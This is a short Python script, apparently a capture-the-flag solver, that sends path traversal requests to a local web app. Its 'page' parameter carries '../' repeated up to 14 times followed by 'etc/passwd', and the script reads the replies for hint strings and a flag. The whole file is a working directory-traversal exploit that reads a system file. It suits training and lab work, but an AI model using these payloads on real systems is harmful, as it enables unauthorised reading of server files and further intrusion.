import requests

base_url = "http://localhost:8080/"

for depth in range(1, 15):
    payload = "../" * depth + "etc/passwd"
    url = base_url + "?page=" + payload
    response = requests.get(url)

    if "Nope" in response.text:
        print(f"Depth {depth}: Nope, not deep enough yet")
    elif "Almost" in response.text:
        print(f"Depth {depth}: Almost! Getting closer...")
    elif "flag" in response.text.lower():
        print(f"Depth {depth}: FLAG FOUND!")
        print(f"Winning URL: {url}")
        for line in response.text.split('\n'):
            if 'flag' in line.lower():
                print(line.strip())
        break
    else:
        print(f"Depth {depth}: Unknown response")